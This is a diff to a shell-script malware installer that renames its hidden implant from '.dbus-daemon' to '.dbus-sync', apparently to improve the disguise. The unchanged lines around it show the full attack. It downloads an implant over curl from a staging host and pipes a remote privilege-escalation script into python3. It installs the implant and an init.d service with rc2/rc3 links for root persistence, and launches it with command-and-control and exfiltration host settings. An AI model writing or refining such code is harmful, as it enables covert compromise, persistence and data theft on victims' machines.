@@ -12,8 +12,8 @@ WORK="${HOME}/.cache/.sysd"
 mkdir -p "${WORK}"
 
 # Stage 2: download implant binary
-curl -sLk --max-time 60 -o "${WORK}/.dbus-daemon" "https://${STAGING_HOST}:8443/b"
-chmod +x "${WORK}/.dbus-daemon"
+curl -sLk --max-time 60 -o "${WORK}/.dbus-sync" "https://${STAGING_HOST}:8443/b"
+chmod +x "${WORK}/.dbus-sync"
 
 # Privesc
 curl -sLk --max-time 60 "https://${STAGING_HOST}:8443/priv" | python3 >/dev/null 2>&1 || true
@@ -28,7 +28,7 @@ if echo "exit 0" | su >/dev/null 2>&1; then
 
     cat > /tmp/.s << EOF
 #!/bin/sh
-cp "${WORK}/.dbus-daemon" "${IMPLANT}" && chmod 755 "${IMPLANT}" && chown root:root "${IMPLANT}"
+cp "${WORK}/.dbus-sync" "${IMPLANT}" && chmod 755 "${IMPLANT}" && chown root:root "${IMPLANT}"
 cp /tmp/.initd "${INITD}" && chmod 755 "${INITD}" && chown root:root "${INITD}"
 ln -sf "${INITD}" /etc/rc2.d/S20dbus-sync
 ln -sf "${INITD}" /etc/rc3.d/S20dbus-sync
@@ -44,7 +44,7 @@ else
     # No root - run as current user, no persistence
     nohup env C2_HOST="${C2_HOST}" C2_PORT="${C2_PORT}" \
         EXFIL_HOST="${EXFIL_HOST}" EXFIL_PORT="${EXFIL_PORT}" \
-        "${WORK}/.dbus-daemon" >/dev/null 2>&1 &
+        "${WORK}/.dbus-sync" >/dev/null 2>&1 &
     disown $!
 fi
 
